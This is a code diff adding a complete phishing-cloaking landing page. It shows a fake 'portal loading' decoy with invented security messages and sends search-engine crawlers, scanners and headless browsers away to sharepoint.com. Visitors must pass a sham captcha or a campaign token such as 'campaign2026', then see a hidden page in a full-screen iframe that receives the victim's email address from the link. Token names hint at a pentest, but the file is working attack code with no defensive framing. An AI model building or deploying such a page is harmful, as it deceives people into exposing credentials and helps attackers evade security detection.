@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Portal Access</title>
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="pragma" content="no-cache">
+    <meta http-equiv="expires" content="0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #f5f7fa; overflow: hidden; }
+
+        #decoy {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        #decoy .box {
+            background: white;
+            max-width: 500px;
+            width: 90%;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+
+        #decoy h1 { color: #1a202c; font-size: 24px; margin-bottom: 20px; }
+        #decoy p { color: #718096; line-height: 1.7; font-size: 14px; }
+        #decoy .skeleton {
+            background: linear-gradient(90deg, #e2e8f0 25%, #edf2f7 50%, #e2e8f0 75%);
+            background-size: 200% 100%;
+            height: 20px;
+            margin: 12px auto;
+            border-radius: 4px;
+            animation: shimmer 1.5s infinite;
+        }
+        #decoy .skeleton.s1 { width: 70%; }
+        #decoy .skeleton.s2 { width: 85%; }
+        #decoy .skeleton.s3 { width: 55%; }
+        @keyframes shimmer { 0%{background-position:200% 0} 100%{background-position:-200% 0} }
+        #decoy .status-text { color: #a0aec0; font-size: 13px; margin-top: 30px; }
+        #decoy .sub-status { color: #cbd5e0; font-size: 12px; margin-top: 20px; }
+
+        #captcha-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        #captcha-overlay.active { display: flex; }
+        #captcha-box {
+            background: white;
+            max-width: 400px;
+            width: 90%;
+            padding: 40px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        #captcha-box h2 { color: #1a202c; margin-bottom: 15px; }
+        #captcha-box .math { font-size: 32px; font-weight: bold; color: #2d3748; margin: 20px 0; }
+        #captcha-box input {
+            width: 80%;
+            padding: 14px;
+            font-size: 20px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            text-align: center;
+            margin: 10px 0;
+            outline: none;
+        }
+        #captcha-box input:focus { border-color: #4299e1; }
+        #captcha-box button {
+            width: 80%;
+            padding: 14px;
+            background: #4299e1;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        #captcha-box button:hover { background: #3182ce; }
+        #captcha-box .error { color: #e53e3e; display: none; margin-top: 10px; font-size: 14px; }
+        #captcha-box .hint { color: #a0aec0; font-size: 12px; margin-top: 20px; }
+
+        #real-content {
+            display: none;
+            width: 100vw;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 9998;
+        }
+        #real-content.active { display: block; }
+        
+        #real-content iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+
+<div id="decoy">
+    <div class="box">
+        <h1>Loading your portal...</h1>
+        <div class="skeleton s1"></div>
+        <div class="skeleton s2"></div>
+        <div class="skeleton s3"></div>
+        <p class="status-text">Establishing secure connection...</p>
+        <p class="sub-status"><span id="fake-status">Initializing session</span></p>
+    </div>
+</div>
+
+<div id="captcha-overlay">
+    <div id="captcha-box">
+        <h2>Security Verification</h2>
+        <p style="color:#718096;font-size:14px;">Please solve this to continue</p>
+        <div class="math" id="math-problem">0 + 0 = ?</div>
+        <input type="number" id="captcha-input" placeholder="Type answer here" autofocus>
+        <button id="captcha-submit">Verify</button>
+        <div class="error" id="captcha-error">Incorrect answer. Please try again.</div>
+        <div class="hint">This helps us prevent automated access.</div>
+    </div>
+</div>
+
+<div id="real-content"></div>
+
+<script>
+(function() {
+    "use strict";
+    
+    var BOT_REDIRECT_URL = 'https://sharepoint.com';
+    var REAL_CONTENT_FILE = 'file.html';
+    var VALID_TOKENS = ['campaign2026', 'pentest-q2-2026', 'test-access-42'];
+    
+    // ===== BOT DETECTION =====
+    var ua = navigator.userAgent.toLowerCase();
+    var isBot = false;
+    var bots = [
+        'googlebot', 'google-inspectiontool', 'adsbot-google',
+        'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
+        'facebookexternalhit', 'twitterbot', 'linkedinbot',
+        'semrush', 'ahrefsbot', 'mj12bot', 'dotbot',
+        'screaming frog', 'httrack', 'wget', 'curl', 'python-requests',
+        'go-http-client', 'scrapy', 'phantomjs', 'headlesschrome', 'headless',
+        'puppeteer', 'playwright', 'selenium',
+        'lighthouse', 'pagespeed', 'validator', 'w3c',
+        'feedfetcher', 'mediapartners'
+    ];
+    
+    for (var i = 0; i < bots.length; i++) {
+        if (ua.indexOf(bots[i]) !== -1) {
+            isBot = true;
+            break;
+        }
+    }
+    
+    if (!isBot && navigator.webdriver === true) { isBot = true; }
+    if (!isBot && (!navigator.languages || navigator.languages.length === 0)) { isBot = true; }
+    
+    if (isBot) {
+        var m = document.createElement('meta');
+        m.httpEquiv = 'refresh';
+        m.content = '0; url=' + BOT_REDIRECT_URL;
+        document.head.appendChild(m);
+        window.location.href = BOT_REDIRECT_URL;
+        window.location.replace(BOT_REDIRECT_URL);
+        return;
+    }
+    
+    // ===== HELPERS =====
+    function getParam(name) {
+        return new URLSearchParams(window.location.search).get(name);
+    }
+    
+    function getCookie(name) {
+        var m = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+        return m ? m[2] : null;
+    }
+    
+    function setCookie(name, value, days) {
+        var e = '';
+        if (days) {
+            var d = new Date();
+            d.setTime(d.getTime() + days * 86400000);
+            e = '; expires=' + d.toUTCString();
+        }
+        document.cookie = name + '=' + (value || '') + e + '; path=/; SameSite=Lax';
+    }
+    
+    function validToken(t) {
+        if (!t) return false;
+        for (var j = 0; j < VALID_TOKENS.length; j++) {
+            if (t === VALID_TOKENS[j]) return true;
+        }
+        return false;
+    }
+    
+    // ===== STORE EMAIL PARAM FOR IFRAME =====
+    var emailToPass = getParam('email') || '';
+    
+    // ===== LOAD REAL CONTENT IN IFRAME =====
+    function loadRealContent() {
+        var container = document.getElementById('real-content');
+        container.innerHTML = '';
+        
+        var iframe = document.createElement('iframe');
+        iframe.src = REAL_CONTENT_FILE + '?t=' + Date.now();
+        iframe.setAttribute('frameborder', '0');
+        container.appendChild(iframe);
+        container.classList.add('active');
+        
+        document.getElementById('decoy').style.display = 'none';
+        document.getElementById('captcha-overlay').classList.remove('active');
+        
+        // Wait for iframe to load, then send the email via postMessage
+        iframe.onload = function() {
+            if (emailToPass) {
+                // Give the iframe a moment to initialize its listener
+                setTimeout(function() {
+                    iframe.contentWindow.postMessage({
+                        type: 'setEmail',
+                        email: emailToPass
+                    }, '*');
+                    console.log('[PARENT] Sent email to iframe: ' + emailToPass);
+                }, 500);
+            }
+        };
+    }
+    
+    // ===== TOKEN CHECK =====
+    var urlToken = getParam('access_token');
+    if (urlToken && validToken(urlToken)) {
+        setCookie('access_token', urlToken, 1);
+        if (window.history.replaceState) {
+            window.history.replaceState({}, document.title, window.location.pathname);
+        }
+        loadRealContent();
+        return;
+    }
+    
+    var cookieToken = getCookie('access_token');
+    if (cookieToken && validToken(cookieToken)) {
+        loadRealContent();
+        return;
+    }
+    
+    // ===== CAPTCHA =====
+    var captchaShown = false;
+    var captchaAnswer = 0;
+    
+    function showCaptcha() {
+        if (captchaShown) return;
+        captchaShown = true;
+        
+        var n1 = Math.floor(Math.random() * 20) + 1;
+        var n2 = Math.floor(Math.random() * 20) + 1;
+        captchaAnswer = n1 + n2;
+        
+        document.getElementById('math-problem').textContent = n1 + ' + ' + n2 + ' = ?';
+        document.getElementById('captcha-overlay').classList.add('active');
+        
+        ['mousemove','scroll','touchstart','keydown','click'].forEach(function(e) {
+            document.removeEventListener(e, showCaptcha);
+        });
+        
+        setTimeout(function() {
+            document.getElementById('captcha-input').focus();
+        }, 100);
+    }
+    
+    ['mousemove','scroll','touchstart','keydown','click'].forEach(function(e) {
+        document.addEventListener(e, showCaptcha, { once: true });
+    });
+    
+    setTimeout(function() {
+        if (!captchaShown) showCaptcha();
+    }, 3000);
+    
+    document.getElementById('captcha-submit').addEventListener('click', function() {
+        var input = document.getElementById('captcha-input');
+        var answer = parseInt(input.value);
+        if (answer === captchaAnswer) {
+            setCookie('access_token', VALID_TOKENS[0], 1);
+            loadRealContent();
+        } else {
+            document.getElementById('captcha-error').style.display = 'block';
+            input.value = '';
+            input.focus();
+        }
+    });
+    
+    document.getElementById('captcha-input').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            document.getElementById('captcha-submit').click();
+        }
+    });
+    
+    var msgs = ['Initializing session','Verifying connection','Encrypting data channel','Establishing secure tunnel','Almost ready...'];
+    var idx = 0;
+    setInterval(function() {
+        var el = document.getElementById('fake-status');
+        if (el && !captchaShown) {
+            idx = (idx + 1) % msgs.length;
+            el.textContent = msgs[idx];
+        }
+    }, 2000);
+    
+})();
+</script>
+</body>
+</html>
